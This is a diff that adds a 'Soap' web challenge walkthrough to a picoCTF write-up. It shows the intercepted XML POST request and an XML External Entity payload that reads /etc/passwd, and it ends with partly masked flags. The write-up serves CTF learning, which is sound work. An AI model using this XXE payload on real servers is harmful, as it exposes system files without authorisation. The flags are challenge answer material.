@@ -170,3 +170,48 @@ The attack is in fact the same as the Part 1, with the only difference being the
 Running the script will provide the flag.
 
 ### picoCTF{edb6ccb7f392059ae1129d8eXXXXXXXX}
+
+# Web
+
+## Soap (Medium)
+The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
+
+Upon opening the we portal one can easily see that there are only 3 buttons, that should provide more details of the related box. 
+Using Burp it is possible to see that a post request gets sent when clicking on a "detail" button.
+The request is formatted in the following manner: 
+
+'''
+POST /data HTTP/1.1
+Host: saturn.picoctf.net:52302
+Content-Length: 61
+User-Agent: ...
+Content-Type: application/xml
+Accept: */*
+Origin: http://saturn.picoctf.net:52302
+Referer: http://saturn.picoctf.net:52302/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <data>
+    <ID>
+      1
+    </ID>
+  </data>
+'''
+
+We can try to forge a post request with an XML External Entity attack (XXE or XEE).
+The post request data should be the following:
+
+'''
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
+  <data>
+    <ID>
+      &ext;
+    </ID>
+  </data>
+'''
+
+### picoCTF{XML_3xtern@l_3nt1t1ty_XXXXXXXX}
